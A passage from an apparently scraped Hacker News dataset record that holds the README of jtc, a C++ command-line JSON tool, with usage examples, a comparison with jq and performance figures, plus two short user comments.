reading json from <stdin> .exception_locus_(), ... }| ],| \"children\": [,],| \"spouse\": null| },| {| ... .exception_spot_(), -------------------------------------------->| (offset: 967) jtc json parsing exception (<stdin>:967): expected_json_value bash $ Complete User Guide there's a lot more under the hood of jtc: various viewing options, directives allowing controlling walks, preserving parts of whole JSONs in namespaces, walking with various criteria, etc interpolating namespaces and walk results in templates and lexemes amending input JSONs via purge/swap/update/insert/move/merge operations comparing JSONs (or their parts) or their schemas various processing modes (streamed, buffered, concurrent parsing, chaining operations, etc) and more ... Refer to a complete User Guide for further examples and guidelines. C++ class and interface usage primer Refer to a Class usage primer document. jtc vs jq: jtc was inspired by the complexity of jq interface (and its DSL), aiming to provide users a tool which would let attaining the desired JSON queries in an easier, more feasible and succinct way utility ideology: jq is a stateful processor with own DSL, variables, operations, control flow logic, IO system, etc, etc jtc is a unix utility confining its functionality to operation types with its data model only (as per unix ideology). jtc performs one major operation at a time (like insertion, update, swap, etc), however multiple operations could be chained using / delimiter jq is non-idiomatic in a unix way, e.g.: one can write a program in jq language that even has nothing to do with JSON. Most of the requests (if not all) to manipulate JSONs are ad hoc type of tasks, and learning jq's DSL for ad hoc type of tasks is an overkill (that purpose is best facilitated with GPL, e.g.: Python). The number of asks on the stackoverflow to facilitate even simple queries for jq is huge - that's the proof in itself that for many people feasibility of attaining their asks with jq is a way too low, hence they default to posting their questions on the forum. jtc on the other hand is a utility (not a language), which employs a novel but powerful concept, which \"embeds\" the ask right into the walk-path. That facilitates a much higher feasibility of attaining a desired result: building a walk-path a lexeme by lexeme, one at a time, provides an immediate visual feedback and let coming up with the desired result rather quickly. learning curve: jq: before you could come up with a query to handle even a relatively simple ask, you need to become an expert in jq language, which will take some time. Coming up with the complex queries requires what it seems having a PhD in jq, or spending lots of time on stackoverflow and similar forums jtc employs only a simple (but powerful) concept of the walk-path (which is made only of 2 types of search lexemes, each type though has several variants) which is quite easy to grasp. handling irregular JSONs: jq: handling irregular JSONs for jq is not a challenge, building a query is! The more irregularities you need to handle the more challenging the query (jq program) becomes jtc was conceived with the idea of being capable of handling complex irregular JSONs with a simplified interface - that all is fitted into the concept of the walk-path, while daisy-chaining multiple operations is possible to satisfy almost every ask. solutions input invariance - most of jtc solutions would be input invariant (hardly the same could be stated for jq). Not that it's impossible to come up with invariant solutions in jq, it's just a lot more harder, while jtc with its walk-path model prompts for invariant solutions. I.e., the invariant solution will keep working even once the JSON outer format changes (the invariant solution only would stop working once the relationship between walked JSON elements changes). E.g.: consider a following query, extract format [ \"name\", \"surname\" ] from 2 types of JSON: bash $ case1='{\"Name\":\"Patrick\", \"Surname\":\"Lynch\", \"gender\":\"male\", \"age\":29}' bash $ case2='[{\"Name\":\"Patrick\", \"Surname\":\"Lynch\", \"gender\":\"male\", \"age\":29},{\"Name\":\"Alice\", \"Surname\":\"Price\", \"gender\":\"female\", \"age\":27}]' a natural, idiomatic jtc solution would be: bash $ <<<$case1 jtc -w'<Name>l:[-1]' -rT'[{{$a}},{{$b}}]' [ \"Patrick\", \"Lynch\" ] bash $ <<<$case2 jtc -w'<Name>l:[-1]' -rT'[{{$a}},{{$b}}]' [ \"Patrick\", \"Lynch\" ] [ \"Alice\", \"Price\" ] While one of the most probable jq solution would be: bash $ <<<$case1 jq -c 'if type == \"array\" then .[] else . end | [.Name, .Surname]' [\"Patrick\",\"Lynch\"] bash $ <<<$case2 jq -c 'if type == \"array\" then .[] else . end | [.Name, .Surname]' [\"Patrick\",\"Lynch\"] [\"Alice\",\"Price\"] The both solutions work correctly, however, any change in the outer encapsulation will break jq's solution , while jtc will keep working even if JSON is reshaped into an irregular structure, e.g.: #jtc: bash $ case3='{\"root\":[{\"Name\":\"Patrick\", \"Surname\":\"Lynch\", \"gender\":\"male\", \"age\":29}, {\"closed circle\":[{\"Name\":\"Alice\", \"Surname\":\"Price\", \"gender\":\"female\", \"age\":27}, {\"Name\":\"Rebecca\", \"Surname\":\"Hernandez\", \"gender\":\"female\", \"age\":28}]}]}' bash $ bash $ <<<$case3 jtc -w'<Name>l:[-1]' -rT'[{{$a}},{{$b}}]' [ \"Patrick\", \"Lynch\" ] [ \"Alice\", \"Price\" ] [ \"Rebecca\", \"Hernandez\" ] #jq: bash $ <<<$case3 jq -c 'if type == \"array\" then .[] else . end | [.Name, .Surname]' [null,null] The same property makes jtc solutions resistant to cases of incomplete data, e.g.: if we drop \"Name\" entry from one of the entries in case 2, jtc solution still works correctly: #jtc: bash $ case2='[{\"Surname\":\"Lynch\", \"gender\":\"male\", \"age\":29},{\"Name\":\"Alice\", \"Surname\":\"Price\", \"gender\":\"female\", \"age\":27}]' bash $ bash $ <<<$case2 jtc -w'<Name>l:[-1]' -rT'[{{$a}},{{$b}}]' [ \"Alice\", \"Price\" ] #jq: bash $ <<<$case2 jq -c 'if type == \"array\" then .[] else . end | [.Name, .Surname]' [null,\"Lynch\"] [\"Alice\",\"Price\"] - i.e., jtc will not assume that user would require some default substitution in case of incomplete data (but if such handling is required then the walk-path can be easily enhanced) programming model jq is written in C language, which drags all intrinsic problems the language has dated its creation (here's what I mean) jtc is written in the idiomatic C++14 using STL only. jtc does not have a single naked memory allocation operator (those few new operators required for legacy interface are implemented as guards), nor it has a single naked pointer acting as a resource holder/owner, thus jtc is guaranteed to be free of memory/resources leaks (at least one class of the problems is off the table) - STL guaranty. Also, jtc is written in a very portable way, it should not cause problems compiling it under any unix like system. JSON numerical fidelity: jq is not compliant with JSON numerical definition. What jq does, it simply converts a symbolic numerical representation to an internal binary and keeps it that way. That approach: is not compliant with JSON definition of the numerical values it has problems retaining required precision might change original representation of numericals leads to incorrect processing of some JSON streams jtc validates all JSON numericals per JSON standard and keep numbers internally in their original literal format, so it's free of all the above caveats, compare: Handling jtc jq 1.6 Invalid Json: [00] <<<'[00]' jtc <<<'[00]' jq -c . Parsing result jtc json parsing exception (<stdin>:3): missed_prior_enumeration [0] Precision test: <<<'[0.99999999999999999]' jtc -r <<<'[0.99999999999999999]' jq -c . Parsing result [ 0.99999999999999999 ] [1] Retaining original format: <<<'[0.00001]' jtc -r <<<'[0.00001]' jq -c . Parsing result [ 0.00001 ] [1e-05] Stream of atomic JSONs: <<<'{}[]\"bar\"\"foo\"00123truefalsenull' jtc -Jr <<<'{}[]\"bar\"\"foo\"00123truefalsenull' jq -sc Parsing result [ {}, [], \"bar\", \"foo\", 0, 0, 123, true, false, null ] parse error: Invalid numeric literal at line 2, column 0 performance: jq is a single-threaded process jtc engages a concurrent (multi-threaded) reading/parsing when multiple files given (the advantage could be observed on multi-core CPU, though it become noticeable only with relatively big JSONs or with relatively big number of files processed) Comparison of single-threaded performance: Here's a 4+ million node JSON file standard.json: bash $ time jtc -zz standard.json 4329975 user 6.085 sec The table below compares jtc and jq performance for similar operations (using TIMEFORMAT=\"user %U sec\"): jtc 1.76 jq 1.6 parsing JSON: parsing JSON: bash $ time jtc -t2 standard.json | md5 bash $ time jq -M . standard.json | md5 d3b56762fd3a22d664fdd2f46f029599 d3b56762fd3a22d664fdd2f46f029599 user 9.110 sec user 18.853 sec removing by key from JSON: removing by key from JSON: bash $ time jtc -t2 -pw'<attributes>l:' standard.json | md5 bash $ time jq -M 'del(..|.attributes?)' standard.json | md5 0624aec46294399bcb9544ae36a33cd5 0624aec46294399bcb9544ae36a33cd5 user 10.027 sec user 27.439 sec updating JSON recursively by label: updating JSON recursively by label: bash $ time jtc -t2 -w'<attributes>l:[-1]' -i'{\"reserved\": null}' standard.json | md5 bash $ time jq -M 'walk(if type == \"object\" and has(\"attributes\") then . + { \"reserved\" : null } else . end)' standard.json | md5 6c86462ae6b71e10e3ea114e86659ab5 6c86462ae6b71e10e3ea114e86659ab5 user 12.715 sec user 29.450 sec Comparison of jtc to jtc (single-threaded to multi-threaded parsing performance): bash $ unset TIMEFORMAT bash $ bash $ # concurrent (multi-threaded) parsing: bash $ time jtc -J / -zz standard.json standard.json standard.json standard.json standard.json 21649876 real 0m10.995s # <- compare these figures user 0m34.083s sys 0m3.288s bash $ bash $ # sequential (single-threaded) parsing: bash $ time jtc -aJ / -zz standard.json standard.json standard.json standard.json standard.json 21649876 real 0m31.717s # <- compare these figures user 0m30.125s sys 0m1.555s bash $ Machine spec used for testing: Model Name: MacBook Pro Model Identifier: MacBookPro15,1 Processor Name: Intel Core i7 Processor Speed: 2,6 GHz Number of Processors: 1 Total Number of Cores: 6 L2 Cache (per Core): 256 KB L3 Cache: 12 MB Hyper-Threading Technology: Enabled Memory: 16 GB 2400 MHz DDR4 compare jtc based solutions with jq's: Here are published some answers for JSON queries using jtc, you may compare those with jq's, as well as study the feasibility of the solutions, test relevant performance, etc Refer to a complete User Guide for further examples and guidelines. ",
          "> jtc is written in idiomatic C++ (the most powerful programming language to date)<p>Citation needed. The `jq` vs `jtc` section is interesting, but author seems a little full of himself with some of the explanations.",
          "The author has also written related tools. One to convert XML to JSON and back (<a href=\"https://github.com/ldn-softdev/jtm\" rel=\"nofollow\">https://github.com/ldn-softdev/jtm</a>) and another to convert JSON to SQLite tables (<a href=\"https://github.com/ldn-softdev/jsl\" rel=\"nofollow\">https://github.com/ldn-softdev/jsl</a>). Combining these with the hxnormalize tool ( <a href=\"https://www.w3.org/Tools/HTML-XML-utils/man1/hxnormalize.html\" rel=\"nofollow\">https://www.w3.org/Tools/HTML-XML-utils/man1/hxnormalize.htm...</a>), one can do very sophisticated manipulation on HTML web pages.<p>HTML -> XML (via hxnormalize) -> JSON (via jtm) -> process using jtc (or even jq)"
        ],
        "story_type": ["Normal"],
        "url": "https://github.com/ldn-softdev/jtc",
        "comments.comment_id": [21197221, 21197356],
        "comments.comment_author": ["meddlepal", "vyuh"],
        "comments.comment_descendants": [3, 2],
        "comments.comment_time": [
          "2019-10-08T21:01:03Z",
          "2019-10-08T21:15:43Z"
        ],
        "comments.comment_text": [
          "> jtc is written in idiomatic C++ (the most powerful programming language to date)<p>Citation needed. The `jq` vs `jtc` section is interesting, but author seems a little full of himself with some of the explanations.",
          "The author has also written related tools. One to convert XML to JSON and back (<a href=\"https://github.com/ldn-softdev/jtm\" rel=\"nofollow\">https://github.com/ldn-softdev/jtm</a>) and another to convert JSON to SQLite tables (<a href=\"https://github.com/ldn-softdev/jsl\" rel=\"nofollow\">https://github.com/ldn-softdev/jsl</a>). Combining these with the hxnormalize tool ( <a href=\"https://www.w3.org/Tools/HTML-XML-utils/man1/hxnormalize.html\" rel=\"nofollow\">https://www.w3.org/Tools/HTML-XML-utils/man1/hxnormalize.htm...</a>), one can do very sophisticated manipulation on HTML web pages.<p>HTML -> XML (via hxnormalize) -> JSON (via jtm) -> process using jtc (or even jq)"
        ],
        "id": "a1822ba3-7d09-4446-8a3c-bc03f616c436",
        "url_text": "jtc - cli tool to extract, manipulate and transform source JSON jtc stand for: JSON transformational chains (used to be JSON test console). jtc offers a powerful way to select one or multiple elements from a source JSON and apply various actions on the selected elements at once (wrap selected elements into a new JSON, filter in/out, sort elements, update elements, insert new elements, remove, copy, move, compare, transform, swap around and many other operations). Enhancement requests and/or questions are more than welcome: ldn.softdev@gmail.com Content: Short description Compilation and installation options Linux and MacOS precompiled binaries Installing via MacPorts Installation on Linux distributions Manual installation Release Notes Quick-start guide list all URLs dump all bookmark names dump all URL's names dump all the URLs and corresponding names Debugging and validating JSON Complete User Guide C++ class and interface usage primer jtc vs jq utility ideology learning curve handling irregular JSONs solutions input invariance programming model JSON numerical fidelity performance compare jtc based solutions with jq's Short description - jtc is a simple yet very powerful and efficient cli utility tool to process and manipulate JSON data jtc offers following features (a short list of main features): simple user interface allowing applying a bulk of changes in a single or chained sets of commands featured walk-path interface lets extracting any combination of data from sourced JSON trees extracted data is representable either as found, or could be encapsulated in JSON array/object or transformed using templates support Regular Expressions when searching source JSON fast and efficient processing of very large JSON files (various built-in search caches) insert/update operations optionally may undergo shell cli evaluation support in-place modifications of the input/source JSON file features namespaces, facilitating interpolation of preserved JSON values in templates supports buffered and streamed modes of input read sports concurrent input JSON reading/parsing (on multi-core CPU) written entirely in C++14, no dependencies (STL only, idiomatic C++, no memory leaks) extensively debuggable conforms JSON specification (json.org) The walk-path feature is easy to understand - it's only made of 2 kinds of lexemes traversing JSON tree, which could be mixed up in any order: subscripts - enclosed into [, ], subscripts let traversing JSON tree downwards (towards the leaves) and upwards (towards the root) search lexemes - encased as <..> or >..< (for a recursive and non-recursive searches respectively); search lexemes facilitate various match criteria defined by an optional suffix and/or quantifier There's also a 3rd kind of lexemes - directives: they typically facilitate other functions like working with namespaces, controlling walk-path execution, etc; directives are syntactically similar to the search lexemes All lexemes can be iterable: iterable subscripts let iterating over children of currently addressed JSON iterables nodes (arrays/objects), while iterable search lexemes let iterating over all (recursive) matches for a given search criteria A walk-path may have an arbitrary number of lexemes -the tool accepts a virtually unlimited number of walk paths. See below more detailed explanation with examples Compilation and installation options For compiling, c++14 (or later) is required. To compile under different platforms: MacOS/BSD: c++ -o jtc -Wall -std=c++14 -Ofast jtc.cpp Linux: non-relocatable (dynamically linked) image: c++ -o jtc -Wall -std=gnu++14 -Ofast -pthread -lpthread jtc.cpp relocatable (statically linked) image: c++ -o jtc -Wall -std=gnu++14 -Ofast -static -Wl,--whole-archive -lrt -pthread -lpthread -Wl,--no-whole-archive jtc.cpp Debian: c++ -o jtc -Wall -std=c++14 -pthread -lpthread -Ofast jtc.cpp (ensure c++ poits to clang++-6.0 or above) Following debug related flags could be passed to jtc when compiling: -DNDEBUG: compile w/o debugs, however it's unadvisable - there's no performance gain from doing so -DNDBG_PARSER: disable debugs coming from parsing JSON (handy when deep debugging huge JSONs and want to skip parsing debugs) -DBG_FLOW: all debuggable function/method calls will disply an entry and exit points -DBG_mTS, -DBG_uTS: display absolute time-stamps in the debug: with millisecond accuracy and with microsecond accuracy respectively -DBG_dTS: used with either of 2 previous flags: makes time-stamp to display delta (since last debug message) instead of absolute stamp -DBG_CC: every call to a copy-constructor in Jnode class will reveal itself (handy for optimization debugging) Linux and MacOS precompiled binaries are available for download Choose the latest precompiled binary: latest macOS if you don't want to go through macOS security hurdle, then remove the quarantine attribute from the file after binary download, e.g. (assuming you opened terminal in the folder where downloaded binary is): bash $ mv ./jtc-macos-64.latest ./jtc bash $ chmod 754 ./jtc bash $ xattr -r -d com.apple.quarantine ./jtc latest linux 64 bit latest linux 32 bit Rename the downloaded file and give proper permissions. E.g., for the latest macOS: mv jtc-macos-64.latest jtc chmod 754 jtc Packaged installations: Installing via MacPorts On MacOS, you can install jtc via the MacPorts package manager: $ sudo port selfupdate $ sudo port install jtc Installation on Linux distributions jtc is packaged in the following Linux distributions and can be installed via the package manager. Fedora: jtc is present in Fedora 31 and later: openSUSE: jtc can be installed on openSUSE Tumbleweed via zypper: or on Leap 15.0 and later by adding the utilities repository and installing jtc via zypper. Manual installation: download jtc-master.zip, unzip it, descend into unzipped folder, compile using an appropriate command, move compiled file into an install location. here're the example steps for MacOS: say, jtc-master.zip has been downloaded to a folder and the terminal app is open in that folder: unzip jtc-master.zip cd jtc-master c++ -o jtc -Wall -std=c++17 -Ofast jtc.cpp sudo mv ./jtc /usr/local/bin/ Release Notes See the latest Release Notes Quick-start guide: run the command jtc -g to read the mini USER-GUIDE, with walk path syntax, usage notes, short examples read the examples just below see stackoverflow-json for lots of worked examples based on Stack Overflow questions refer to the complete User Guide for further examples and guidelines. Consider a following JSON (a mockup of a bookmark container), stored in a file Bookmarks: { \"Bookmarks\": [ { \"children\": [ { \"children\": [ { \"name\": \"The New York Times\", \"stamp\": \"2017-10-03, 12:05:19\", \"url\": \"https://www.nytimes.com/\" }, { \"name\": \"HuffPost UK\", \"stamp\": \"2017-11-23, 12:05:19\", \"url\": \"https://www.huffingtonpost.co.uk/\" } ], \"name\": \"News\", \"stamp\": \"2017-10-02, 12:05:19\" }, { \"children\": [ { \"name\": \"Digital Photography Review\", \"stamp\": \"2017-02-27, 12:05:19\", \"url\": \"https://www.dpreview.com/\" } ], \"name\": \"Photography\", \"stamp\": \"2017-02-27, 12:05:19\" } ], \"name\": \"Personal\", \"stamp\": \"2017-01-22, 12:05:19\" }, { \"children\": [ { \"name\": \"Stack Overflow\", \"stamp\": \"2018-05-01, 12:05:19\", \"url\": \"https://stackoverflow.com/\" }, { \"name\": \"C++ reference\", \"stamp\": \"2018-06-21, 12:05:19\", \"url\": \"https://en.cppreference.com/\" } ], \"name\": \"Work\", \"stamp\": \"2018-03-06, 12:07:29\" } ] } 1. let's start with a simple thing - list all URLs: bash $ jtc -w'<url>l:' Bookmarks \"https://www.nytimes.com/\" \"https://www.huffingtonpost.co.uk/\" \"https://www.dpreview.com/\" \"https://stackoverflow.com/\" \"https://en.cppreference.com/\" Let's take a look at the walk-path <url>l:: search lexemes are enclosed in angular brackets <, > - that style provides a recursive search throughout JSON suffix l instructs to search among labels only quantifier : instructs to find all occurrences, such quantifiers makes a path iterable 2. dump all bookmark names from the Work folder: bash $ jtc -w'<Work>[-1][children][:][name]' Bookmarks \"Stack Overflow\" \"C++ reference\" Here the walk-path <Work>[-1][children][:][name] is made of following lexemes: a. <Work>: find within a JSON tree the first occurrence where the JSON string value is matching \"Work\" exactly b. [-1]: step up one tier in the JSON tree structure (i.e., address an immediate parent of the found JSON element) c. [children]: select/address a node whose label is \"children\" (it'll be a JSON array, at the same tier with Work) d. [:]: select each node in the array e. [name]: select/address a node with the label \"name\" in order to understand better how the walk-path works, let's run that series of cli in a slow-motion, gradually adding lexemes to the path one by one, perhaps with the option -l to see also the labels (if any) of the selected elements: bash $ jtc -w'<Work>' -l Bookmarks \"name\": \"Work\" bash $ jtc -w'<Work>[-1]' -l Bookmarks { \"children\": [ { \"name\": \"Stack Overflow\", \"stamp\": \"2018-05-01, 12:05:19\", \"url\": \"https://stackoverflow.com/\" }, { \"name\": \"C++ reference\", \"stamp\": \"2018-06-21, 12:05:19\", \"url\": \"https://en.cppreference.com/\" } ], \"name\": \"Work\", \"stamp\": \"2018-03-06, 12:07:29\" } bash $ jtc -w'<Work>[-1][children]' -l Bookmarks \"children\": [ { \"name\": \"Stack Overflow\", \"stamp\": \"2018-05-01, 12:05:19\", \"url\": \"https://stackoverflow.com/\" }, { \"name\": \"C++ reference\", \"stamp\": \"2018-06-21, 12:05:19\", \"url\": \"https://en.cppreference.com/\" } ] bash $ jtc -w'<Work>[-1][children][:]' -l Bookmarks { \"name\": \"Stack Overflow\", \"stamp\": \"2018-05-01, 12:05:19\", \"url\": \"https://stackoverflow.com/\" } { \"name\": \"C++ reference\", \"stamp\": \"2018-06-21, 12:05:19\", \"url\": \"https://en.cppreference.com/\" } bash $ jtc -w'<Work>[-1][children][:][name]' -l Bookmarks \"name\": \"Stack Overflow\" \"name\": \"C++ reference\" B.t.w., a better (a bit faster and more efficient) walk-path achieving the same query would be this: jtc -w'<Work>[-1][children]<name>l:' Bookmarks 3. dump all URL's names: bash $ jtc -w'<url>l:[-1][name]' Bookmarks \"The New York Times\" \"HuffPost UK\" \"Digital Photography Review\" \"Stack Overflow\" \"C++ reference\" this walk-path <url>l:[-1][name]: finds recursively (encasement <, >) each (:) JSON element with a label (l) matching url then for an each found JSON element, select its parent ([-1]) then, select a JSON (sub)element with the label \"name\" 4. dump all the URLs and their corresponding names, preferably wrap found pairs in JSON array: bash $ jtc -w'<url>l:' -w'<url>l:[-1][name]' -jl Bookmarks [ { \"name\": \"The New York Times\", \"url\": \"https://www.nytimes.com/\" }, { \"name\": \"HuffPost UK\", \"url\": \"https://www.huffingtonpost.co.uk/\" }, { \"name\": \"Digital Photography Review\", \"url\": \"https://www.dpreview.com/\" }, { \"name\": \"Stack Overflow\", \"url\": \"https://stackoverflow.com/\" }, { \"name\": \"C++ reference\", \"url\": \"https://en.cppreference.com/\" } ] yes, multiple walks (-w) are allowed option -j will wrap the walked outputs into a JSON array, but not just, option -l used together with -j will ensure relevant walks are grouped together (try without -l) if multiple walks (-w) are present, by default, walked results will be printed interleaved (if it can be interleaved) 5. Debugging and validating JSON jtc is extensively debuggable: the more times option -d is passed the more debugs will be produced. Enabling too many debugs might be overwhelming, though one specific case many would find extremely useful - when validating a failing JSON: bash $ <addressbook-sample.json jtc jtc json exception: expected_json_value If JSON is big, it's desirable to locate the parsing failure point. Passing just one -d let easily spotting the parsing failure point and its locus: bash $ <addressbook-sample.json jtc -d .display_opts(), option set[0]: -d (internally imposed: ) .init_inputs(), reading json from <stdin> .exception_locus_(), ... }| ],| \"children\": [,],| \"spouse\": null| },| {| ... .exception_spot_(), -------------------------------------------->| (offset: 967) jtc json parsing exception (<stdin>:967): expected_json_value bash $ Complete User Guide there's a lot more under the hood of jtc: various viewing options, directives allowing controlling walks, preserving parts of whole JSONs in namespaces, walking with various criteria, etc interpolating namespaces and walk results in templates and lexemes amending input JSONs via purge/swap/update/insert/move/merge operations comparing JSONs (or their parts) or their schemas various processing modes (streamed, buffered, concurrent parsing, chaining operations, etc) and more ... Refer to a complete User Guide for further examples and guidelines. C++ class and interface usage primer Refer to a Class usage primer document. jtc vs jq: jtc was inspired by the complexity of jq interface (and its DSL), aiming to provide users a tool which would let attaining the desired JSON queries in an easier, more feasible and succinct way utility ideology: jq is a stateful processor with own DSL, variables, operations, control flow logic, IO system, etc, etc jtc is a unix utility confining its functionality to operation types with its data model only (as per unix ideology). jtc performs one major operation at a time (like insertion, update, swap, etc), however multiple operations could be chained using / delimiter jq is non-idiomatic in a unix way, e.g.: one can write a program in jq language that even has nothing to do with JSON. Most of the requests (if not all) to manipulate JSONs are ad hoc type of tasks, and learning jq's DSL for ad hoc type of tasks is an overkill (that purpose is best facilitated with GPL, e.g.: Python). The number of asks on the stackoverflow to facilitate even simple queries for jq is huge - that's the proof in itself that for many people feasibility of attaining their asks with jq is a way too low, hence they default to posting their questions on the forum. jtc on the other hand is a utility (not a language), which employs a novel but powerful concept, which \"embeds\" the ask right into the walk-path. That facilitates a much higher feasibility of attaining a desired result: building a walk-path a lexeme by lexeme, one at a time, provides an immediate visual feedback and let coming up with the desired result rather quickly. learning curve: jq: before you could come up with a query to handle even a relatively simple ask, you need to become an expert in jq language, which will take some time. Coming up with the complex queries requires what it seems having a PhD in jq, or spending lots of time on stackoverflow and similar forums jtc employs only a simple (but powerful) concept of the walk-path (which is made only of 2 types of search lexemes, each type though has several variants) which is quite easy to grasp. handling irregular JSONs: jq: handling irregular JSONs for jq is not a challenge, building a query is! The more irregularities you need to handle the more challenging the query (jq program) becomes jtc was conceived with the idea of being capable of handling complex irregular JSONs with a simplified interface - that all is fitted into the concept of the walk-path, while daisy-chaining multiple operations is possible to satisfy almost every ask. solutions input invariance - most of jtc solutions would be input invariant (hardly the same could be stated for jq). Not that it's impossible to come up with invariant solutions in jq, it's just a lot more harder, while jtc with its walk-path model prompts for invariant solutions. I.e., the invariant solution will keep working even once the JSON outer format changes (the invariant solution only would stop working once the relationship between walked JSON elements changes). E.g.: consider a following query, extract format [ \"name\", \"surname\" ] from 2 types of JSON: bash $ case1='{\"Name\":\"Patrick\", \"Surname\":\"Lynch\", \"gender\":\"male\", \"age\":29}' bash $ case2='[{\"Name\":\"Patrick\", \"Surname\":\"Lynch\", \"gender\":\"male\", \"age\":29},{\"Name\":\"Alice\", \"Surname\":\"Price\", \"gender\":\"female\", \"age\":27}]' a natural, idiomatic jtc solution would be: bash $ <<<$case1 jtc -w'<Name>l:[-1]' -rT'[{{$a}},{{$b}}]' [ \"Patrick\", \"Lynch\" ] bash $ <<<$case2 jtc -w'<Name>l:[-1]' -rT'[{{$a}},{{$b}}]' [ \"Patrick\", \"Lynch\" ] [ \"Alice\", \"Price\" ] While one of the most probable jq solution would be: bash $ <<<$case1 jq -c 'if type == \"array\" then .[] else . end | [.Name, .Surname]' [\"Patrick\",\"Lynch\"] bash $ <<<$case2 jq -c 'if type == \"array\" then .[] else . end | [.Name, .Surname]' [\"Patrick\",\"Lynch\"] [\"Alice\",\"Price\"] The both solutions work correctly, however, any change in the outer encapsulation will break jq's solution , while jtc will keep working even if JSON is reshaped into an irregular structure, e.g.: #jtc: bash $ case3='{\"root\":[{\"Name\":\"Patrick\", \"Surname\":\"Lynch\", \"gender\":\"male\", \"age\":29}, {\"closed circle\":[{\"Name\":\"Alice\", \"Surname\":\"Price\", \"gender\":\"female\", \"age\":27}, {\"Name\":\"Rebecca\", \"Surname\":\"Hernandez\", \"gender\":\"female\", \"age\":28}]}]}' bash $ bash $ <<<$case3 jtc -w'<Name>l:[-1]' -rT'[{{$a}},{{$b}}]' [ \"Patrick\", \"Lynch\" ] [ \"Alice\", \"Price\" ] [ \"Rebecca\", \"Hernandez\" ] #jq: bash $ <<<$case3 jq -c 'if type == \"array\" then .[] else . end | [.Name, .Surname]' [null,null] The same property makes jtc solutions resistant to cases of incomplete data, e.g.: if we drop \"Name\" entry from one of the entries in case 2, jtc solution still works correctly: #jtc: bash $ case2='[{\"Surname\":\"Lynch\", \"gender\":\"male\", \"age\":29},{\"Name\":\"Alice\", \"Surname\":\"Price\", \"gender\":\"female\", \"age\":27}]' bash $ bash $ <<<$case2 jtc -w'<Name>l:[-1]' -rT'[{{$a}},{{$b}}]' [ \"Alice\", \"Price\" ] #jq: bash $ <<<$case2 jq -c 'if type == \"array\" then .[] else . end | [.Name, .Surname]' [null,\"Lynch\"] [\"Alice\",\"Price\"] - i.e., jtc will not assume that user would require some default substitution in case of incomplete data (but if such handling is required then the walk-path can be easily enhanced) programming model jq is written in C language, which drags all intrinsic problems the language has dated its creation (here's what I mean) jtc is written in the idiomatic C++14 using STL only. jtc does not have a single naked memory allocation operator (those few new operators required for legacy interface are implemented as guards), nor it has a single naked pointer acting as a resource holder/owner, thus jtc is guaranteed to be free of memory/resources leaks (at least one class of the problems is off the table) - STL guaranty. Also, jtc is written in a very portable way, it should not cause problems compiling it under any unix like system. JSON numerical fidelity: jq is not compliant with JSON numerical definition. What jq does, it simply converts a symbolic numerical representation to an internal binary and keeps it that way. That approach: is not compliant with JSON definition of the numerical values it has problems retaining required precision might change original representation of numericals leads to incorrect processing of some JSON streams jtc validates all JSON numericals per JSON standard and keep numbers internally in their original literal format, so it's free of all the above caveats, compare: Handling jtc jq 1.6 Invalid Json: [00] <<<'[00]' jtc <<<'[00]' jq -c . Parsing result jtc json parsing exception (<stdin>:3): missed_prior_enumeration [0] Precision test: <<<'[0.99999999999999999]' jtc -r <<<'[0.99999999999999999]' jq -c . Parsing result [ 0.99999999999999999 ] [1] Retaining original format: <<<'[0.00001]' jtc -r <<<'[0.00001]' jq -c . Parsing result [ 0.00001 ] [1e-05] Stream of atomic JSONs: <<<'{}[]\"bar\"\"foo\"00123truefalsenull' jtc -Jr <<<'{}[]\"bar\"\"foo\"00123truefalsenull' jq -sc Parsing result [ {}, [], \"bar\", \"foo\", 0, 0, 123, true, false, null ] parse error: Invalid numeric literal at line 2, column 0 performance: jq is a single-threaded process jtc engages a concurrent (multi-threaded) reading/parsing when multiple files given (the advantage could be observed on multi-core CPU, though it become noticeable only with relatively big JSONs or with relatively big number of files processed) Comparison of single-threaded performance: Here's a 4+ million node JSON file standard.json: bash $ time jtc -zz standard.json 4329975 user 6.085 sec The table below compares jtc and jq performance for similar operations (using TIMEFORMAT=\"user %U sec\"): jtc 1.76 jq 1.6 parsing JSON: parsing JSON: bash $ time jtc -t2 standard.json | md5 bash $ time jq -M . standard.json | md5 d3b56762fd3a22d664fdd2f46f029599 d3b56762fd3a22d664fdd2f46f029599 user 9.110 sec user 18.853 sec removing by key from JSON: removing by key from JSON: bash $ time jtc -t2 -pw'<attributes>l:' standard.json | md5 bash $ time jq -M 'del(..|.attributes?)' standard.json | md5 0624aec46294399bcb9544ae36a33cd5 0624aec46294399bcb9544ae36a33cd5 user 10.027 sec user 27.439 sec updating JSON recursively by label: updating JSON recursively by label: bash $ time jtc -t2 -w'<attributes>l:[-1]' -i'{\"reserved\": null}' standard.json | md5 bash $ time jq -M 'walk(if type == \"object\" and has(\"attributes\") then . + { \"reserved\" : null } else . end)' standard.json | md5 6c86462ae6b71e10e3ea114e86659ab5 6c86462ae6b71e10e3ea114e86659ab5 user 12.715 sec user 29.450 sec Comparison of jtc to jtc (single-threaded to multi-threaded parsing performance): bash $ unset TIMEFORMAT bash $ bash $ # concurrent (multi-threaded) parsing: bash $ time jtc -J / -zz standard.json standard.json standard.json standard.json standard.json 21649876 real 0m10.995s # <- compare these figures user 0m34.083s sys 0m3.288s bash $ bash $ # sequential (single-threaded) parsing: bash $ time jtc -aJ / -zz standard.json standard.json standard.json standard.json standard.json 21649876 real 0m31.717s # <- compare these figures user 0m30.125s sys 0m1.555s bash $ Machine spec used for testing: Model Name: MacBook Pro Model Identifier: MacBookPro15,1 Processor Name: Intel Core i7 Processor Speed: 2,6 GHz Number of Processors: 1 Total Number of Cores: 6 L2 Cache (per Core): 256 KB L3 Cache: 12 MB Hyper-Threading Technology: Enabled Memory: 16 GB 2400 MHz DDR4 compare jtc based solutions with jq's: Here are published some answers for JSON queries using jtc, you may compare those with jq's, as well as study the feasibility of the solutions, test relevant performance, etc Refer to a complete User Guide for further examples and guidelines. ",
        "_version_": 1718527430437634048
      },
      {
        "story_id": [19988548],
        "story_author": ["axiomdata316"],
        "story_descendants": [169],
        "story_score": [597],
        "story_time": ["2019-05-23T04:42:59Z"],
        "story_title": "The Art of Command Line (2015)",
        "search": [
          "The Art of Command Line (2015)",
          "https://github.com/jlevy/the-art-of-command-line",
